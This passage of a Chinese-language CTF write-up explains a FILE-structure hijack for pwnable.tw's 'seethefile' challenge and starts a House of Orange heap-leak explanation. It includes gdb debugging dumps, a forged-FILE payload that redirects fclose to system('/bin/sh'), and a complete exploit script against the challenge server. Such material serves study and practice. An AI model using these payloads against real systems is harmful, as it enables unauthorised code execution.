<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x6e69622f (<span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">EBX: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">ECX: 0xffffffff</span><br><span class="line">EDX: 0x0</span><br><span class="line">ESI: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">EDI: 0xf7e16700 (0xf7e16700)</span><br><span class="line">EBP: 0xffffd728 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd700 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:	add    esi,0x15815)</span><br><span class="line">EIP: 0xf7e74a24 (&lt;_IO_new_fclose+68&gt;:	cmp    edi,DWORD PTR [edx+0x8])</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e74a14 &lt;_IO_new_fclose+52&gt;:	jne    0xf7e74aa8 &lt;_IO_new_fclose+200&gt;</span><br><span class="line">   0xf7e74a1a &lt;_IO_new_fclose+58&gt;:	mov    edx,DWORD PTR [esi+0x48]</span><br><span class="line">   0xf7e74a1d &lt;_IO_new_fclose+61&gt;:	mov    edi,DWORD PTR gs:0x8</span><br><span class="line">=&gt; 0xf7e74a24 &lt;_IO_new_fclose+68&gt;:	cmp    edi,DWORD PTR [edx+0x8]</span><br><span class="line">   0xf7e74a27 &lt;_IO_new_fclose+71&gt;:	je     0xf7e74a4f &lt;_IO_new_fclose+111&gt;</span><br><span class="line">   0xf7e74a29 &lt;_IO_new_fclose+73&gt;:	xor    eax,eax</span><br><span class="line">   0xf7e74a2b &lt;_IO_new_fclose+75&gt;:	mov    ecx,0x1</span><br><span class="line">   0xf7e74a30 &lt;_IO_new_fclose+80&gt;:	cmp    DWORD PTR gs:0xc,0x0</span><br></pre></td></tr></table></figure>

<p>紧接着，<code>cmp    edi,DWORD PTR [edx+0x8]</code>在此处会发生报错，因为此时 edx 为 0 ，由上下文我们知道，</p>
<p><code>    mov    edx,DWORD PTR [esi+0x48]</code>, edx 由，[esi+0x48] 赋值，因此我们需要将[esi+0x48]设置成一个可读地址，esi 此时 fp 地址，所以我们修改 payload为如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buffer+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>因为后面有以下操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x6e69622f (<span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">EBX: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0x804b270 --&gt; 0x1</span><br><span class="line">ESI: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">EDI: 0xf7e16700 (0xf7e16700)</span><br><span class="line">EBP: 0xffffd728 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd700 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:	add    esi,0x15815)</span><br><span class="line">EIP: 0xf7e74a53 (&lt;_IO_new_fclose+115&gt;:	mov    edx,eax)</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e74a4a &lt;_IO_new_fclose+106&gt;:	mov    eax,DWORD PTR [esi]</span><br><span class="line">   0xf7e74a4c &lt;_IO_new_fclose+108&gt;:	mov    DWORD PTR [edx+0x8],edi</span><br><span class="line">   0xf7e74a4f &lt;_IO_new_fclose+111&gt;:	add    DWORD PTR [edx+0x4],0x1</span><br><span class="line">=&gt; 0xf7e74a53 &lt;_IO_new_fclose+115&gt;:	mov    edx,eax</span><br><span class="line">   0xf7e74a55 &lt;_IO_new_fclose+117&gt;:	and    edx,0x8000</span><br><span class="line">   0xf7e74a5b &lt;_IO_new_fclose+123&gt;:	<span class="built_in">test</span>   ah,0x20</span><br><span class="line">   0xf7e74a5e &lt;_IO_new_fclose+126&gt;:	je     0xf7e74aa8 &lt;_IO_new_fclose+200&gt;</span><br><span class="line">   0xf7e74a60 &lt;_IO_new_fclose+128&gt;:	sub    esp,0xc</span><br></pre></td></tr></table></figure>

<p>此时 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xf7e74a4c &lt;_IO_new_fclose+108&gt;:	mov    DWORD PTR [edx+0x8],edi</span><br><span class="line">0xf7e74a4f &lt;_IO_new_fclose+111&gt;:	add    DWORD PTR [edx+0x4],0x1</span><br></pre></td></tr></table></figure>

<p>edx 为 fp+0x48 后的地址，此时如果也将 赋值为 buffer 地址，会修改掉 fp 的内容，所以我们随便往后偏移0x10</p>
</li>
<li><p>控制程序流程</p>
<p> 接着调试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">EAX: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">EBX: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">ECX: 0x0</span><br><span class="line">EDX: 0x0</span><br><span class="line">ESI: 0x0</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd728 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd6e0 --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">EIP: 0xf7e80910 (&lt;_IO_new_file_close_it+256&gt;:	movsx  eax,BYTE PTR [ebx+0x46])</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e8090c &lt;_IO_new_file_close_it+252&gt;:	pop    edi</span><br><span class="line">   0xf7e8090d &lt;_IO_new_file_close_it+253&gt;:	ret</span><br><span class="line">   0xf7e8090e &lt;_IO_new_file_close_it+254&gt;:	xchg   ax,ax</span><br><span class="line">=&gt; 0xf7e80910 &lt;_IO_new_file_close_it+256&gt;:	movsx  eax,BYTE PTR [ebx+0x46]</span><br><span class="line">   0xf7e80914 &lt;_IO_new_file_close_it+260&gt;:	sub    esp,0xc</span><br><span class="line">   0xf7e80917 &lt;_IO_new_file_close_it+263&gt;:	mov    eax,DWORD PTR [ebx+eax*1+0x94]</span><br><span class="line">   0xf7e8091e &lt;_IO_new_file_close_it+270&gt;:	push   ebx</span><br><span class="line">   0xf7e8091f &lt;_IO_new_file_close_it+271&gt;:	call   DWORD PTR [eax+0x44]</span><br></pre></td></tr></table></figure>

<p>我们此时跟到 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0xf7e80910 &lt;_IO_new_file_close_it+256&gt;:	movsx  eax,BYTE PTR [ebx+0x46]</span><br><span class="line">   0xf7e80914 &lt;_IO_new_file_close_it+260&gt;:	sub    esp,0xc</span><br><span class="line">   0xf7e80917 &lt;_IO_new_file_close_it+263&gt;:	mov    eax,DWORD PTR [ebx+eax*1+0x94]</span><br><span class="line">   0xf7e8091e &lt;_IO_new_file_close_it+270&gt;:	push   ebx</span><br><span class="line">   0xf7e8091f &lt;_IO_new_file_close_it+271&gt;:	call   DWORD PTR [eax+0x44]</span><br></pre></td></tr></table></figure>

<p>如果此时控制 eax ，我们则能控制程序流程，关键在于 ebx 和 eax 两个寄存器</p>
<p><code>movsx  eax,BYTE PTR [ebx+0x46]</code> —&gt; eax == 0</p>
<p><code>mov    eax,DWORD PTR [ebx+eax*1+0x94]</code> —&gt; eax = [ebx+0x94] ;ebx 此时为 fp 地址。</p>
<p>则此时， eax = fp + 0x94</p>
<p>我们要控制的跳转地址为  eax = [[fp+0x94]+0x44]</p>
<p>所以我们设置如下payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buffer+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>



<p>构造出来的file 结构如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ telescope 0x804b260 0x94</span><br><span class="line">0000| 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">0004| 0x804b264 --&gt; 0x68732f (<span class="string">&#x27;/sh&#x27;</span>)</span><br><span class="line">0008| 0x804b268 --&gt; 0x0 </span><br><span class="line">0012| 0x804b26c --&gt; 0x0 </span><br><span class="line">0016| 0x804b270 --&gt; 0x0 </span><br><span class="line">0020| 0x804b274 --&gt; 0x0 </span><br><span class="line">0024| 0x804b278 --&gt; 0x0 </span><br><span class="line">0028| 0x804b27c --&gt; 0x0 </span><br><span class="line">0032| 0x804b280 --&gt; 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">0036| 0x804b284 --&gt; 0x0 </span><br><span class="line">0040| 0x804b288 --&gt; 0x0 </span><br><span class="line">0044| 0x804b28c --&gt; 0x0 </span><br><span class="line">0048| 0x804b290 --&gt; 0x0 </span><br><span class="line">0052| 0x804b294 --&gt; 0x0 </span><br><span class="line">0056| 0x804b298 --&gt; 0x0 </span><br><span class="line">0060| 0x804b29c --&gt; 0x0 </span><br><span class="line">0064| 0x804b2a0 --&gt; 0x0 </span><br><span class="line">0068| 0x804b2a4 --&gt; 0x0 </span><br><span class="line">0072| 0x804b2a8 --&gt; 0x804b270 --&gt; 0x0 </span><br><span class="line">0076| 0x804b2ac --&gt; 0x0 </span><br><span class="line">0080| 0x804b2b0 --&gt; 0x0 </span><br><span class="line">0084| 0x804b2b4 --&gt; 0x0 </span><br><span class="line">0088| 0x804b2b8 --&gt; 0x0 </span><br><span class="line">0092| 0x804b2bc --&gt; 0x0 </span><br><span class="line">0096| 0x804b2c0 --&gt; 0x0 </span><br><span class="line">--More--(25/148)</span><br><span class="line">0100| 0x804b2c4 --&gt; 0x0 </span><br><span class="line">0104| 0x804b2c8 --&gt; 0x0 </span><br><span class="line">0108| 0x804b2cc --&gt; 0x0 </span><br><span class="line">0112| 0x804b2d0 --&gt; 0x0 </span><br><span class="line">0116| 0x804b2d4 --&gt; 0x0 </span><br><span class="line">0120| 0x804b2d8 --&gt; 0x0 </span><br><span class="line">0124| 0x804b2dc --&gt; 0x0 </span><br><span class="line">0128| 0x804b2e0 --&gt; 0x0 </span><br><span class="line">0132| 0x804b2e4 --&gt; 0x0 </span><br><span class="line">0136| 0x804b2e8 --&gt; 0x0 </span><br><span class="line">0140| 0x804b2ec --&gt; 0x0 </span><br><span class="line">0144| 0x804b2f0 --&gt; 0x0 </span><br><span class="line">0148| 0x804b2f4 --&gt; 0x804b2b4 --&gt; 0x0 </span><br><span class="line">0152| 0x804b2f8 --&gt; 0xf7e51da0 (&lt;__libc_system&gt;:	sub    esp,0xc)</span><br><span class="line">0156| 0x804b2fc --&gt; 0x0 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>最后的 infoleak 只需要 读 <code>/proc/self/map</code> 即可</p>
</li>
</ul>
<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> swpwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;python&#x27;, &#x27;/pwn/notiterm.py&#x27;, &#x27;-p&#x27;, &#x27;15111&#x27;, &#x27;-t&#x27;, &#x27;OSXTerminal&#x27;, &#x27;-e&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;python&#x27;, &#x27;/pwn/notiterm.py&#x27;, &#x27;-p&#x27;, &#x27;23333&#x27;, &#x27;-t&#x27;, &#x27;terminal&#x27;, &#x27;-e&#x27;]</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;/pwn/notiterm.py&#x27;</span>,<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;iterm&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io,elf,libc = init_pwn(<span class="string">&quot;./seethefile&quot;</span>,<span class="string">&quot;libc_32.so.6&quot;</span>,remote_detail = (<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10200</span>),is_env = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 1. Open</span></span><br><span class="line">  <span class="comment"># 2. Read</span></span><br><span class="line">  <span class="comment"># 3. Write to screen</span></span><br><span class="line">  <span class="comment"># 4. Close</span></span><br><span class="line">  <span class="comment"># 5. Exit</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span>(<span class="params">nm</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(nm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">nm</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(nm)</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## -------- read remote libc ---------</span></span><br><span class="line"><span class="comment"># read_file(&#x27;/proc/self/maps&#x27;)</span></span><br><span class="line"><span class="comment"># libc_addr = io.recvuntil(&quot;r-xp&quot;)</span></span><br><span class="line"><span class="comment"># print(libc_addr)</span></span><br><span class="line"><span class="comment"># libc.address = int(libc_addr.split(&#x27;-&#x27;)[-3].split(&#x27;\n&#x27;)[1], 16)</span></span><br><span class="line"><span class="comment"># # log.info(&quot;\033[33m&quot; + hex(libc.address) + &quot;\033[0m&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------- set localhost libc --------</span></span><br><span class="line"></span><br><span class="line">libc.address = <span class="number">0xf7e17000</span></span><br><span class="line">lg(<span class="string">&#x27;libc addr:&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b _IO_new_fclose</span></span><br><span class="line"><span class="string">    b *0xf7e74a60</span></span><br><span class="line"><span class="string">    b *0xF7E80910</span></span><br><span class="line"><span class="string">    b *0xF7E80917</span></span><br><span class="line"><span class="string">    b *0xf7e74a24</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- set fp ---&gt; buffer addr -------</span></span><br><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buffer+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- fake fp ---&gt; _lock pointer to 0 -----</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x48,&#x27;\x00&#x27;) </span></span><br><span class="line"><span class="comment"># payload += p32(buffer+0x10)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x94,&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment"># payload += p32(0x804b2f8 - 0x44)</span></span><br><span class="line"><span class="comment"># payload += p32(0xdeadbeef)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p32(libc.symbols[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;system addr:&#x27;</span>,libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">leave_name(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># lg(&quot;libc addr:&quot;,libc.address)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="0x02-houseoforange"><a href="#0x02-houseoforange" class="headerlink" title="0x02 houseoforange"></a>0x02 houseoforange</h2><p>这其实是一种，在没有 free 的情况下，构造 unsorted bin 进行 libc leak的方法。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4173">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4172</a></p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-4128a667b72278b7487ad17e90278547-57b582.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-4128a667b72278b7487ad17e90278547-57b582.png" alt="img"></a></p>
<p>当用户申请的 chunk， top  chunk 不能满足的时候，有可能使用 sysmalloc 进行内存分配，当调用 sysmalloc 分配的时候，这里有两个选择</p>
<ol>
<li>mmap</li>
<li>扩展brk</li>
</ol>
<p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#2336">sysmalloc source code</a></p>
<p>从源码我们可以得知，如果得满足 <code>(*unsigned* *long*) (nb) &gt;= (*unsigned* *long*) (mp_.mmap_threshold)</code> 不成立，则不会调用mmap</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">          &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">    try_mmap:</span><br></pre></td></tr></table></figure>



<p>当申请的 chunk 大小不大于 mmap 分配阈值，mmap_threshold<code>的值为</code>128*1024</p>
<p>扩展 brk top chunk 的时候还有两个assert 的存在</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>



<p>总结下就是：</p>
<ol>
<li><p>old_size &gt;= MINSIZE，即old_size不能太小</p>
</li>
<li><p>old_top 设置了 prev_inuse 标志位</p>
</li>
<li><p>old_end正好为页尾，即(&amp;old_top+old_size)&amp;(0x1000-1) == 0</p>
</li>
<li><p>old_size &lt; nb+MINSIZE，old_size不够需求</p>
</li>
</ol>
<p>当 top chunk 扩展完毕，旧的top chunk就会被free掉。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">    set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">    set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">    _int_free (av, old_top, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<p>支持，如果我们能覆盖 top chunk，则可能伪造一个 unsorte bin ，进行info leak 。以及此处还有另外一个 trick</p>
<p>当我们申请一个largebin 的时候</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = smallbin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     <span class="comment">/* maintain large bins in 